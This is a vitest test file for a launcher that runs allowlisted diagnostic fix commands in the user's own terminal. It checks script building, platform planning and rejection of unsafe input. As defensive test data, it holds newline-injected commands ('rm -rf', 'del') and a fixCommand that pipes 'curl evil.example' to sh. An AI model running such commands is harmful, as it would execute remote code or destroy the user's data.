import { readFileSync } from "node:fs";
import { describe, expect, it, vi } from "vitest";
import {
  buildPosixCommandScript,
  buildWindowsCommandScript,
  createExternalCommandLauncher,
  findDoctorFixCommand,
  planExternalCommandLaunch,
} from "../src/terminalLauncher.ts";

/**
 * DOC-01 — run a Doctor fix command in the user's own terminal (native
 * openPiInstallInTerminal: a one-shot script with a real TTY, never a pipe).
 * The command is ALWAYS a server-composed constant (doctor fixCommand); the
 * wire carries only a check id — pinned at the route helper level.
 */

describe("command script builders (DOC-01)", () => {
  it("windows: batch with the fix command and a pause, control chars rejected", () => {
    const script = buildWindowsCommandScript("npm install -g @earendil-works/pi-coding-agent");
    expect(script).toContain("npm install -g @earendil-works/pi-coding-agent");
    expect(script).toContain("pause");
    expect(script).toContain("chcp 65001");
    const nl = String.fromCharCode(10);
    expect(() => buildWindowsCommandScript("evil" + nl + "del x")).toThrow(/command/i);
  });

  it("posix: sh script with the fix command and a keep-open read", () => {
    const script = buildPosixCommandScript("gh auth login");
    expect(script.startsWith("#!/bin/sh\n")).toBe(true);
    expect(script).toContain("gh auth login");
    expect(script).toContain("read");
    const nl = String.fromCharCode(10);
    expect(() => buildPosixCommandScript("evil" + nl + "rm -rf x")).toThrow(/command/i);
  });
});

describe("planExternalCommandLaunch", () => {
  const cmd = "npm install -g pi";
  it("win32 plans a one-shot batch script (wt not needed — the script owns the window)", () => {
    expect(planExternalCommandLaunch("win32", cmd, () => null)).toEqual({
      kind: "winScript",
      script: buildWindowsCommandScript(cmd),
    });
  });

  it("darwin plans the .command script via open(1)", () => {
    const resolve = (name: string) => (name === "open" ? "/usr/bin/open" : null);
    expect(planExternalCommandLaunch("darwin", cmd, resolve)).toEqual({
      kind: "macScript",
      open: "/usr/bin/open",
      script: buildPosixCommandScript(cmd),
    });
  });

  it("linux plans the script through the terminal trio, else null", () => {
    const only = (available: string) => (name: string) =>
      name === available ? `/usr/bin/${available}` : null;
    expect(planExternalCommandLaunch("linux", cmd, only("x-terminal-emulator"))).toEqual({
      kind: "linuxScript",
      terminal: "/usr/bin/x-terminal-emulator",
      argsPrefix: ["-e"],
      script: buildPosixCommandScript(cmd),
    });
    expect(planExternalCommandLaunch("linux", cmd, () => null)).toBeNull();
    expect(planExternalCommandLaunch("sunos", cmd, () => "/bin/x")).toBeNull();
  });
});

describe("createExternalCommandLauncher", () => {
  it("win32 writes the script and starts it as the ONE quoted target", async () => {
    const child = {
      on: vi.fn(),
      once: vi.fn((event: string, cb: (code?: number) => void) => {
        if (event === "close") queueMicrotask(() => cb(0));
      }),
      unref: vi.fn(),
    };
    const spawnFn = vi.fn(() => child);
    const launcher = createExternalCommandLauncher({
      platform: "win32",
      spawnFn,
      resolveCommand: () => null,
    });
    await launcher.run("npm install -g pi");
    const [command, args, options] = spawnFn.mock.calls[0]! as unknown as [
      string,
      string[],
      Record<string, unknown>,
    ];
    expect(command).toBe("start");
    expect(args[0]).toBe('""');
    const scriptPath = args[1]!.replaceAll("^", "").replaceAll('"', "");
    expect(scriptPath.endsWith(".cmd")).toBe(true);
    expect(readFileSync(scriptPath, "utf8")).toBe(buildWindowsCommandScript("npm install -g pi"));
    expect(options).toMatchObject({ shell: true, detached: true });
  });

  it("fails typed when no terminal can be planned", async () => {
    const launcher = createExternalCommandLauncher({
      platform: "linux",
      spawnFn: vi.fn(),
      resolveCommand: () => null,
    });
    await expect(launcher.run("gh auth login")).rejects.toThrow(/no supported terminal/i);
  });
});

describe("findDoctorFixCommand (the wire carries ONLY a check id; runnable is an ALLOWLIST)", () => {
  const report = {
    checks: [
      { id: "pi-binary", label: "Pi", status: "error", detail: "", fixCommand: "npm i -g pi" },
      {
        id: "github",
        label: "GitHub CLI",
        status: "warn",
        detail: "",
        fixCommand: "gh auth login",
      },
      { id: "node", label: "Node", status: "ok", detail: "" },
      // Present fixCommand but OUTSIDE the allowlist: a one-shot export is
      // useless (dies with the window), so it must never be runnable.
      {
        id: "auth",
        label: "AI model connection",
        status: "warn",
        detail: "",
        fixCommand: "export ANTHROPIC_API_KEY=YOUR_KEY_HERE",
      },
    ],
    signedInProviders: [],
  };
  it("returns the server-composed command for allowlisted checks", () => {
    expect(findDoctorFixCommand(report, "pi-binary")).toBe("npm i -g pi");
    expect(findDoctorFixCommand(report, "github")).toBe("gh auth login");
  });
  it("fails closed: unknown ids, fixless checks, non-allowlisted fixes", () => {
    expect(findDoctorFixCommand(report, "nope")).toBeNull();
    expect(findDoctorFixCommand(report, "node")).toBeNull();
    expect(findDoctorFixCommand(report, "auth")).toBeNull();
  });
  it("the charset backstop rejects a fix that grew shell metacharacters", () => {
    const hostile = {
      checks: [
        {
          id: "pi-binary",
          label: "Pi",
          status: "error",
          detail: "",
          fixCommand: "npm i -g pi; curl evil.example | sh",
        },
      ],
      signedInProviders: [],
    };
    expect(findDoctorFixCommand(hostile, "pi-binary")).toBeNull();
  });
});
